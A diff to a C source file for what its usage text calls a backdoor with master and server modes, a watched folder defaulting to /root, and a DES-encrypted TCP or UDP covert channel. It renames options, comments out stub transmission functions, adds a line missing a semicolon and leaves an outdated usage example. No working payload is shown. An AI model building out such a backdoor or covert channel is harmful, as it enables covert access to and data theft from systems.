@@ -10,7 +10,6 @@
 #include <string.h>
 #include <sys/time.h>
 #include <openssl/des.h>
-#include <openssl/evp.h>
 
 #include "util.h"
 
@@ -22,10 +21,11 @@ void error(const char *err) {
 void usage(char *name) {
 	printf("Usage: %s [options]\n", name);
 	printf(" -c Use client mode: Act as master.\n");
-	printf(" -s Use server mode: Act as backdoor. [default]\n");
+	printf(" -b Use server mode: Act as backdoor. [default]\n");
 	printf(" -h Show this help listing.\n");
 	printf(
-			" -i <arg> Remote host address for client mode. [default=127.0.0.1]\n");
+			" -d <arg> Destination host address for client/server mode. [default=127.0.0.1]\n");
+	printf(" -s <arg> Source host address for client/server mode.")
 	printf(" -w <arg> Folder to watch. [default=/root]\n");
 	printf(" -x [tu] Covert channel to use(TCP OR UDP). [default=TCP]\n");
 	printf(" EXAMPLES:\t %s -c -i 192.168.0.1 -x t\n", name);
@@ -90,7 +90,7 @@ void decrypt(char *key, char *msg, int size) {
 	free(result);
 }
 
-char* buildTransmission(char *data, int *len, char type) {
+/*char* buildTransmission(char *data, int *len, char type) {
 	char *buff;
 
 	return buff;
@@ -105,4 +105,4 @@ char* getTransmission(char *packet, int *len, char *type) {
 	int data_len;
 
 	return data;
-}
+}*/
